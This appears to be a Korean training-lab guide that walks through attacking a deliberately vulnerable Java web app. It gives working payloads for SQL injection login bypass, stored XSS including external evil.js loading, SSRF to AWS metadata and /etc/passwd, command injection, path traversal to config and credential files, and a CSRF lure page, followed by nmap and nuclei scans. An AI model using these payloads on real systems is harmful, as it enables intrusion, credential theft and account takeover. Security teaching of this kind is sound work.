2. SQL Injection - 로그인 우회​

2.1 취약점 설명​

로그인 API가 사용자 입력을 직접 SQL 쿼리에 연결하여 인증 우회 가능

취약 코드 (AuthController.java:26-27):

String sql = "SELECT * FROM users WHERE user_id = '" + id + "' AND password = '" + pw + "'";

SQL 쿼리 구조 분석:

SELECT * FROM users WHERE user_id = '[id값]' AND password = '[pw값]'

⚠️ 중요: pw 파라미터가 쿼리의 마지막에 위치하므로, pw에 인젝션해야 주석(--)으로 뒷부분을 무력화할 수 있습니다.

2.2 대상 API​

POST /api/login
Content-Type: application/x-www-form-urlencoded

id=xxx&pw=xxx

2.3 실습 방법​

Step 1) 로그인 페이지 접속

  • http://3.34.212.183/login.html

Step 2) 아무 값이나 입력하고 로그인 시도

  • ID: admin
  • PW: test

Step 3) BurpSuite에서 요청 캡처 확인

POST /api/login HTTP/1.1
Host: 3.34.212.183
Content-Type: application/x-www-form-urlencoded

id=admin&pw=test

Step 4) 요청을 Repeater로 전송

  • 요청 우클릭 → Send to Repeater

Step 5) Payload 수정 후 Send

2.4 검증된 Payload 목록​

✅ Payload 1: 기본 OR 조건 (권장)​

id=admin&pw=test' OR '1'='1

생성되는 SQL:

SELECT * FROM users WHERE user_id = 'admin' AND password = 'test' OR '1'='1'

원리: OR '1'='1'이 항상 참이므로 전체 조건이 참이 됨

✅ Payload 2: 주석 처리​

id=admin&pw=' OR '1'='1'--

생성되는 SQL:

SELECT * FROM users WHERE user_id = 'admin' AND password = '' OR '1'='1'--'

원리: -- 이후는 주석 처리되어 무시됨

✅ Payload 3: 항상 참인 조건​

id=admin&pw=' OR 1=1--

생성되는 SQL:

SELECT * FROM users WHERE user_id = 'admin' AND password = '' OR 1=1--'

✅ Payload 4: 빈 ID로 아무 계정 로그인​

id=x&pw=' OR '1'='1

생성되는 SQL:

SELECT * FROM users WHERE user_id = 'x' AND password = '' OR '1'='1'

원리: 존재하지 않는 ID여도 OR 조건으로 첫 번째 사용자로 로그인

✅ Payload 5: UNION 기반 (데이터 추출용)​

id=admin&pw=' UNION SELECT 'admin','admin','admin','admin@test.com','ADMIN','010','addr','Y'--

원리: UNION으로 가짜 결과 행을 주입하여 인증 우회

2.5 URL 인코딩 버전​

BurpSuite Repeater에서 특수문자 문제 시 사용:

id=admin&pw=test'+OR+'1'%3d'1

2.6 예상 결과​

로그인 성공

📸 스크린샷 포인트: Repeater 화면에서 Request/Response 함께 캡처

2.7 실패하는 Payload (참고)​

다음은 동작하지 않는 예시입니다:

# ❌ id에 인젝션 - AND 조건으로 인해 실패
id=admin' OR '1'='1'--&pw=anything

이유: id에 인젝션하면 AND password = 'anything' 조건이 남아서 실패

3. Stored XSS - 문의 게시판​

3.1 취약점 설명​

문의 작성 시 사용자 입력이 이스케이프 없이 DB에 저장되고, 목록/상세 조회 시 그대로 출력되어 스크립트 실행

취약 코드 (InquiryController.java):

  • 저장: PreparedStatement 사용 (SQL Injection은 방어됨)
  • 출력: HTML 이스케이프 없이 JSON으로 반환 → 프론트엔드에서 innerHTML로 렌더링

3.2 대상 API​

POST /api/inquiry/write  (저장)
GET /api/inquiry/list    (실행 - 목록)
GET /api/inquiry/detail  (실행 - 상세)

3.3 실습 방법​

Step 1) 로그인 상태에서 문의 작성 페이지 접속

  • http://3.34.212.183/inquiry_write.html

Step 2) XSS Payload 입력

3.4 검증된 Payload 목록​

✅ Payload 1: 기본 alert (제목에 삽입)​

  • 분류: 강의
  • 제목: <script>alert('XSS')</script>
  • 내용: 정상 내용

✅ Payload 2: 쿠키 탈취 시뮬레이션 (내용에 삽입)​

  • 분류: 강의
  • 제목: 정상 제목
  • 내용: <script>alert(document.cookie)</script>

✅ Payload 3: 이미지 태그 onerror​

  • 제목: <img src=x onerror="alert('XSS')">

원리: 존재하지 않는 이미지 로드 실패 시 onerror 핸들러 실행

✅ Payload 4: SVG 태그 활용​

  • 제목: <svg onload="alert('SVG XSS')">

원리: SVG 로드 시 onload 이벤트 발생

✅ Payload 5: 외부 스크립트 로드 (고급)​

  • 내용: <script src="http://공격자서버/evil.js"></script>

원리: 외부 서버의 악성 스크립트 로드

3.5 확인 방법​

Step 3) 등록 후 문의 목록 페이지 접속

  • http://3.34.212.183/board.html

Step 4) alert 창 실행 확인

3.6 예상 결과​

목록 페이지 또는 상세 페이지 접속 시 JavaScript alert 창 실행

📸 스크린샷 포인트:

  1. alert 창이 뜬 화면
  2. 개발자 도구(F12) → Elements 탭에서 스크립트 태그 확인

4. SSRF - 서버 측 요청 위조​

4.1 취약점 설명​

프록시 API가 사용자 입력 URL에 대해 아무런 검증 없이 서버에서 직접 요청을 수행

취약 코드 (InquiryController.java:167-175):

@GetMapping("/api/inquiry/proxy")
public ResponseEntity<byte[]> proxy(@RequestParam String url) {
    // [취약점] 입력된 URL에 대해 아무런 검증 없이 서버가 직접 접속
    URL targetUrl = new URL(url);
    HttpURLConnection connection = (HttpURLConnection) targetUrl.openConnection();
    connection.setRequestMethod("GET");
    // ...
}

4.2 대상 API​

GET /api/inquiry/proxy?url=xxx

4.3 실습 방법​

Step 1) 브라우저에서 직접 테스트

4.4 검증된 Payload 목록​

✅ Payload 1: 외부 사이트 접근 (정상 동작 확인)​

http://3.34.212.183/api/inquiry/proxy?url=http://example.com

결과: example.com의 HTML 내용이 반환됨

✅ Payload 2: 내부 서비스 스캔 (localhost)​

http://3.34.212.183/api/inquiry/proxy?url=http://localhost:8080/

원리: 서버 자신의 Tomcat에 접근

✅ Payload 3: 내부 네트워크 스캔 (127.0.0.1)​

http://3.34.212.183/api/inquiry/proxy?url=http://127.0.0.1:3306/

원리: 내부 MariaDB 포트 접근 시도

✅ Payload 4: AWS 메타데이터 접근 (클라우드 환경)​

http://3.34.212.183/api/inquiry/proxy?url=http://169.254.169.254/latest/meta-data/

원리: AWS EC2 인스턴스 메타데이터 API 접근 → IAM 자격 증명 탈취 가능

✅ Payload 5: 파일 프로토콜 (실패할 수 있음)​

http://3.34.212.183/api/inquiry/proxy?url=file:///etc/passwd

원리: file:// 프로토콜로 서버 로컬 파일 읽기 시도

Step 2) BurpSuite Repeater에서 테스트

5. Command Injection - 시스템 명령 실행​

5.1 취약점 설명​

Ping API가 사용자 입력을 쉘 명령어에 직접 연결하여 임의 명령 실행 가능

취약 코드 (PingController.java:36-41):

String[] cmd;
if (os.contains("win")) {
    cmd = new String[] { "cmd.exe", "/c", "ping -n 1 " + host };
} else {
    cmd = new String[] { "sh", "-c", "ping -c 1 " + host };  // 쉘 호출!
}
Process process = Runtime.getRuntime().exec(cmd);

⚠️ 권한 필요: 이 API는 ADMIN 권한이 필요합니다.

5.2 대상 API​

GET /api/ping?host=xxx
Cookie: JSESSIONID=관리자세션

5.3 실습 방법​

Step 1) 관리자 계정으로 로그인 필요

  • admin 계정 또는 ADMIN 역할 계정

Step 2) BurpSuite Repeater에서 테스트

5.4 검증된 Payload 목록​

✅ Payload 1: 세미콜론으로 명령어 연결​

GET /api/ping?host=8.8.8.8;id HTTP/1.1
Host: 3.34.212.183
Cookie: JSESSIONID=관리자세션ID

생성되는 명령어: ping -c 1 8.8.8.8;id

예상 결과:

PING 8.8.8.8 ...
uid=1000(ubuntu) gid=1000(ubuntu) groups=...

✅ Payload 2: 파이프로 출력 전달​

GET /api/ping?host=8.8.8.8|cat /etc/passwd HTTP/1.1

생성되는 명령어: ping -c 1 8.8.8.8|cat /etc/passwd

✅ Payload 3: 백틱으로 명령어 치환​

GET /api/ping?host=`whoami`.example.com HTTP/1.1

원리: 백틱 내 명령어가 먼저 실행됨

✅ Payload 4: AND 연산자​

GET /api/ping?host=8.8.8.8 && cat /etc/passwd HTTP/1.1

URL 인코딩:

GET /api/ping?host=8.8.8.8%20%26%26%20cat%20/etc/passwd HTTP/1.1

✅ Payload 5: 개행 문자로 명령어 분리​

GET /api/ping?host=8.8.8.8%0aid HTTP/1.1

원리: %0a는 줄바꿈(LF) → 새 명령어로 해석

5.5 예상 결과​

시스템 명령어 실행 결과가 응답에 포함됨

📸 스크린샷 포인트:

  1. id 또는 whoami 실행 결과
  2. /etc/passwd 파일 내용

6. Path Traversal - 파일 다운로드 취약점​

6.1 취약점 설명​

파일 다운로드 API가 경로 검증 없이 사용자 입력을 파일 경로에 직접 사용

취약 코드 (FileController.java:21-23):

@GetMapping("/api/file/download")
public ResponseEntity<Resource> downloadFile(@RequestParam String saveName, ...) {
    Path path = Paths.get("uploads/" + saveName);  // 경로 검증 없음!
    // ...
}

6.2 대상 API​

GET /api/file/download?saveName=xxx&originName=xxx

6.3 실습 방법​

Step 1) BurpSuite Repeater에서 테스트

6.4 검증된 Payload 목록​

✅ Payload 1: 상위 디렉토리 이동 (../etc/passwd)​

GET /api/file/download?saveName=../../../etc/passwd&originName=passwd.txt HTTP/1.1
Host: 3.34.212.183

원리: ../로 uploads 디렉토리를 벗어나 시스템 파일 접근

✅ Payload 2: Tomcat 설정 파일​

GET /api/file/download?saveName=../../opt/tomcat/apache-tomcat-9.0.30/conf/tomcat-users.xml&originName=config.xml HTTP/1.1

목적: Tomcat 관리자 계정 정보 탈취

✅ Payload 3: 애플리케이션 설정 파일​

GET /api/file/download?saveName=../application.properties&originName=config.txt HTTP/1.1

목적: DB 접속 정보 등 민감 설정 탈취

✅ Payload 4: URL 인코딩 우회​

GET /api/file/download?saveName=..%2F..%2F..%2Fetc%2Fpasswd&originName=passwd.txt HTTP/1.1

원리: %2F는 /의 URL 인코딩

✅ Payload 5: 이중 인코딩 우회​

GET /api/file/download?saveName=..%252F..%252F..%252Fetc%252Fpasswd&originName=passwd.txt HTTP/1.1

원리: 일부 WAF 우회용

8. 권한 검증 미흡 - 공지사항 작성​

8.1 취약점 설명​

공지사항 작성 API가 로그인 여부만 확인하고 관리자(ADMIN) 권한은 확인하지 않음

취약 코드 (NoticeController.java:42-46):

String loginUser = (String) session.getAttribute("loginUser");
if (loginUser == null) return "로그인 필요";
// role 체크 없음! 누구나 공지 작성 가능

9. CSRF - 회원 정보 변경​

9.1 취약점 설명​

모든 상태 변경 API에 CSRF 토큰이 없어서, 악성 페이지에서 사용자 모르게 요청 가능

취약 포인트 (MemberController.java):

  • PUT /api/member/update - CSRF 토큰 없음
  • DELETE /api/member/withdraw - CSRF 토큰 없음

9.2 대상 API​

PUT /api/member/update
DELETE /api/member/withdraw

9.3 실습 방법​

Step 1) 공격용 HTML 파일 생성 (로컬에서)

csrf_test.html:

<!DOCTYPE html>
<html>
<head>
    <title>무료 경품 이벤트!</title>
</head>
<body>
    <h1>🎁 축하합니다! 경품에 당첨되셨습니다!</h1>
    <p>아래 버튼을 클릭하세요.</p>
    
    <!-- 회원정보 수정 CSRF -->
    <script>
        function attack() {
            fetch('http://3.34.212.183/api/member/update', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: 'include',  // 쿠키 포함
                body: JSON.stringify({
                    email: 'hacked@evil.com',
                    phone: '010-9999-9999',
                    address: '해킹된 주소',
                    marketingAgree: true
                })
            })
            .then(r => r.text())
            .then(data => alert('결과: ' + data));
        }
    </script>
    
    <button onclick="attack()">경품 받기</button>
</body>
</html>

Step 2) victim 계정으로 대상 사이트 로그인 (다른 브라우저/시크릿 모드)

  • http://3.34.212.183/login.html
  • victim / Test1234!

Step 3) 로그인 상태에서 csrf_test.html 파일 열기

  • 파일 더블클릭 또는 브라우저에서 file:///경로/csrf_test.html

Step 4) "경품 받기" 버튼 클릭

Step 5) victim 계정 마이페이지에서 정보 변경 확인

  • http://3.34.212.183/mypage.html

9.4 예상 결과​

victim의 이메일, 전화번호, 주소가 공격자가 지정한 값으로 변경됨

📸 스크린샷 포인트:

  1. CSRF 공격 페이지
  2. 변경된 회원 정보

9.5 회원 탈퇴 CSRF (더 위험)​

<script>
    fetch('http://3.34.212.183/api/member/withdraw', {
        method: 'DELETE',
        credentials: 'include'
    });
</script>

10. Kali Linux 도구 활용​

10.1 nmap - 포트/서비스 스캔​

# 기본 포트 스캔
nmap 3.34.212.183

# 서비스 버전 탐지
nmap -sV 3.34.212.183

# 종합 스캔 (OS + 서비스 + 스크립트)
sudo nmap -p 22,80,8080,3306 -sS -Pn -T4 3.34.212.183

예상 결과:

80/tcp   open  http
8080/tcp open  http-proxy
3306/tcp open  mysql

10.2 Nuclei - 자동 취약점 스캔​

# Go 설치 (필요 시)
sudo apt update
sudo apt install golang-go -y

# Nuclei 설치
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# PATH 설정 (.bashrc 또는 .zshrc)
echo 'export PATH=$HOME/go/bin:$PATH' >> ~/.zshrc
source ~/.zshrc

# 설치 확인
nuclei -version

# 템플릿 업데이트
nuclei -update-templates

기본 사용법​

# 단일 URL 스캔
nuclei -u http://<target>

# 포트 포함
nuclei -u http://<target>:8080

# HTTPS
nuclei -u https://<target>

# IP 주소
nuclei -u 3.34.212.183

# 네트워크 서비스 (포트 지정)
nuclei -u 3.34.212.183:8080

자동 스캔(추천)​

# Automatic Scanning - 기술 스택 자동 감지
nuclei -u http://3.34.212.183 -as -rl 50 -c 10

# 예시
nuclei -u http://3.34.212.183:8080 -as -rl 50 -c 10

# Markdown 출력
nuclei -u http://3.34.212.183 -as -rl 50 -c 10 -markdown -o report.md

Step 2) sqlmap 실행
